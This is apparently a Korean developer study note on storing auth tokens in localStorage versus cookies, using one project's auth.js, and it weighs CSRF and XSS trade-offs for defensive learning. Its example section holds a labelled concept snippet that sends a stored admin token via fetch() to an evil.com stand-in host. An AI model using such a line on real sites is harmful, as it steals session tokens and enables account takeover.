# 토큰 저장 방식 — localStorage vs 쿠키

---

- **카테고리**: 네트워크/보안, 웹 개발
- **상태**: 완료
- **기준 시점**: 2026-09-08
- **관련 레포지토리**: `RottenNoble-Project`
- **엔진**: `Web`

---

## 출처

`RottenNobleProject` — `RottenNobleProject-Architecture.md` 3회차(인증 흐름) 코드 학습에서
`frontend/src/api/auth.js`의 `localStorage` 사용을 보다가 분리한 주제. [CORS](../Network/CORS.md)에서
다룬 "왜 이 프로젝트는 CSRF에 상대적으로 안전한가"의 근본 원인이 바로 이 저장 방식이다.

## 정의

로그인 성공 후 서버가 준 토큰을 브라우저 어디에 보관할지 정하는 문제다. 가장 흔한 두 선택지가
**쿠키**(브라우저가 자동으로 관리하고, 설정에 따라 요청마다 자동으로 서버에 실어 보냄)와
**`localStorage`**(자바스크립트가 직접 읽고 써야 하는 브라우저 내장 키-값 저장소, 자동으로
요청에 실리지 않음)다.

## 요약

이 프로젝트는 토큰을 `localStorage`에 저장하고, 매 요청마다 자바스크립트가 직접
`Authorization: Bearer {token}` 헤더에 실어 보낸다 — 이 선택이 [CORS](../Network/CORS.md) 문서에서 본
"와일드카드가 있어도 CSRF는 안 통한다"는 결과의 진짜 원인이다. 대신 XSS(악성 스크립트 주입)
공격에는 쿠키 방식보다 더 취약하다는 대가가 있다.

## 상세

### 이 프로젝트의 실제 구현

```js
// frontend/src/api/auth.js
const TOKEN_KEY = 'rotten_admin_token';

export function getToken() {
  return localStorage.getItem(TOKEN_KEY);
}

export async function login(username, password) {
  // ... 서버에 로그인 요청 ...
  localStorage.setItem(TOKEN_KEY, body.data.token);
}

export function authHeaders() {
  const token = getToken();
  return token ? { Authorization: `Bearer ${token}` } : {};
}
```

로그인에 성공하면 토큰을 `localStorage`에 저장해두고, 이후 보호된 요청(`createPost` 등)을 보낼
때마다 `authHeaders()`가 그 값을 꺼내 헤더에 직접 실어준다. 브라우저는 이 과정에 전혀 개입하지
않는다 — 순전히 이 프로젝트의 자바스크립트 코드가 "토큰을 꺼내고, 헤더에 넣는다"는 두 동작을
직접 수행하고 있다.

### 쿠키였다면 무엇이 달라졌을까

만약 서버가 로그인 응답에서 `Set-Cookie: session=...` 헤더로 토큰을 내려줬다면, 그 뒤로는
브라우저가 알아서 그 쿠키를 **같은 도메인으로 가는 모든 요청에 자동으로** 실어 보낸다.
개발자가 매 요청마다 헤더를 직접 챙길 필요가 없어서 편리하지만, 바로 이 "자동으로"라는 성질이
[CORS 문서](../Network/CORS.md)에서 설명한 CSRF 문제의 근원이다 — 다른 사이트가 몰래 요청을 보내도
브라우저가 쿠키를 자동으로 붙여주기 때문이다.

### 왜 `localStorage`를 골랐는가 (추정)

이 프로젝트의 문서에는 `localStorage`를 선택한 이유가 명시적으로 남아있지는 않다. 다만 코드
구조로 보면, 기존 `RottenNoble-HttpServer`/`TCPServer`가 이미 헤더 기반 토큰 인증 방식으로
Redis 세션을 다루고 있었고([Redis](../Infrastructure/Redis.md), `MEMO-WEB-04`), 그 인프라와 일관된 인증
방식(Bearer 토큰)을 프런트에도 그대로 적용하다 보니 자연스럽게 "토큰을 어딘가에 저장했다가
헤더로 직접 실어 보내야 하는" `localStorage` 방식으로 이어진 것으로 보인다. 헤더 기반 인증은
애초에 쿠키가 아니므로, 저장 위치도 쿠키가 아닌 `localStorage`나 `sessionStorage`가 자연스러운
짝이 된다.

### `localStorage`의 진짜 약점 — XSS

`localStorage`는 CSRF에는 강하지만, **XSS(Cross-Site Scripting)**에는 쿠키보다 약하다. 만약
이 프로젝트의 프런트엔드 코드 어딘가에(예: 사용자 입력을 제대로 이스케이프하지 않고 화면에
그대로 렌더링하는 부분) 악성 스크립트가 주입될 수 있다면, 그 스크립트는
`localStorage.getItem('rotten_admin_token')`을 호출해서 토큰 값을 통째로 읽어낼 수 있다 — 그
값을 공격자의 서버로 전송하면 완전한 계정 탈취로 이어진다.

쿠키에는 `HttpOnly`라는 속성이 있는데, 이걸 설정하면 자바스크립트가 그 쿠키를 아예 읽을 수
없게 만들 수 있다 — XSS가 발생해도 스크립트가 쿠키 값 자체는 훔쳐가지 못한다(대신 그 스크립트가
쿠키를 실은 요청을 대신 보내게 만드는 방식의 공격은 여전히 가능하다). `localStorage`에는 이런
"자바스크립트로부터 격리"하는 옵션이 아예 없다 — 정의상 자바스크립트가 접근하기 위해 만들어진
저장소이기 때문이다.

## 비교표

| 항목 | `localStorage` (이 프로젝트) | 쿠키 (`HttpOnly` 미설정) | 쿠키 (`HttpOnly` 설정) |
|---|---|---|---|
| 요청에 자동으로 실리는가 | 아니오(직접 헤더에 넣어야 함) | 예(같은 도메인 요청마다 자동) | 예 |
| CSRF 취약성 | 낮음(토큰을 몰라서 위조 요청 못 만듦) | 높음(자동 첨부가 공격에 악용됨) | 높음(여전히 자동 첨부됨) |
| XSS로 값을 직접 읽을 수 있는가 | 예(`localStorage.getItem`으로 그대로) | 예(`document.cookie`로 읽힘) | **아니오**(자바스크립트 접근 차단) |
| 이 프로젝트의 선택 | **사용 중** | 사용 안 함 | 사용 안 함 |

## 질문

- **Q. 그럼 `HttpOnly` 쿠키가 항상 더 안전한 것 아닌가?**
  A. 각각 다른 공격에 강하다 — `HttpOnly` 쿠키는 XSS로부터 토큰 자체를 지켜주지만 CSRF에는
  여전히 노출되고(별도로 CSRF 토큰 같은 방어가 추가로 필요하다), `localStorage`는 CSRF에는
  강하지만 XSS로부터 토큰을 지켜주지 못한다. "어느 쪽이 절대적으로 낫다"가 아니라, 이 프로젝트가
  더 신경 써야 할 위협이 무엇인지에 따라 갈리는 트레이드오프다.

- **Q. 이 프로젝트는 XSS 위험에 실제로 얼마나 노출돼 있나?**
  A. 코드를 보면 사용자 입력(방명록 메시지, 글 내용)을 화면에 그대로 렌더링하는 부분이 있는데,
  React는 기본적으로 JSX에 들어간 문자열을 자동으로 이스케이프해준다(예:
  `<p>{message}</p>`처럼 쓰면 `<script>` 태그가 텍스트로만 표시되고 실행되지 않는다). `
  dangerouslySetInnerHTML`처럼 이 기본 방어를 일부러 우회하는 코드를 쓰지 않는 한, React
  자체가 가장 흔한 XSS 경로를 기본으로 막아준다 — 이 프로젝트가 그 위험한 API를 쓰고 있는지는
  아직 전체 코드를 다 확인하지 않았지만, 지금까지 읽은 페이지들에서는 보이지 않았다.

## 예시 코드

```js
// 공격자가 XSS를 성공시켰다고 가정할 때, localStorage 토큰이 얼마나 쉽게 유출되는지
// (이 프로젝트에 있는 코드가 아니라, 취약점의 위험성을 보여주기 위한 개념 예시)
fetch('https://evil.com/steal', {
  method: 'POST',
  body: localStorage.getItem('rotten_admin_token'),
});
```

```js
// 실제 이 프로젝트 코드 — 토큰을 헤더에 직접 실어 보내는 부분
export function authHeaders() {
  const token = getToken();
  return token ? { Authorization: `Bearer ${token}` } : {};
}
```

## 플로우차트

(생략 — 저장 위치에 따라 "자동으로 실리는가/아닌가"라는 단일 분기가 핵심이라 비교표로 충분하다.)

## 실무

실무에서는 두 방식 다 널리 쓰이지만, 최근 흐름은 "액세스 토큰은 메모리(자바스크립트 변수, 새로
고침하면 사라짐)에만 두고, 리프레시 토큰만 `HttpOnly` 쿠키에 둔다"는 절충안 쪽으로 기울고 있다
— XSS로부터는 액세스 토큰이 메모리에 있어 상대적으로 안전하고(페이지를 벗어나면 사라짐), 그
리프레시 토큰은 `HttpOnly`라 스크립트로 못 훔친다. `localStorage`에 토큰을 직접 두는 이
프로젝트의 방식은 구현이 단순하다는 장점이 있지만, 보안을 더 엄격히 요구하는 실무 서비스에서는
점점 덜 권장되는 패턴이다 — 다만 관리자 한 명만 쓰는 개인 프로젝트 규모에서 이 정도 절충은
합리적인 선택으로 볼 수 있다.

## 같이 보기

- [CORS](../Network/CORS.md) — 이 저장 방식이 CSRF 방어에 미치는 실제 효과
- [JWT vs Redis 세션](./JWT-vs-Redis-Session.md) — 토큰이 "무엇을 담고 있는가"의 문제, 이 문서는
  "어디에 저장하는가"의 문제로 서로 다른 축이다
- [React](../WebDevelopment/React.md) — JSX의 기본 이스케이프가 XSS 위험을 줄여주는 방식

## 참고자료

- [OWASP — XSS 방지 치트시트](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN — Window.localStorage](https://developer.mozilla.org/ko/docs/Web/API/Window/localStorage)

## 개정 이력

| 날짜 | 무엇을 바꿨나 | 계기 |
|---|---|---|
| 2026-09-08 | 최초 작성 | `auth.js`의 `localStorage` 사용과 CORS 문서의 CSRF 논의를 계기로 독립 주제로 정리 |
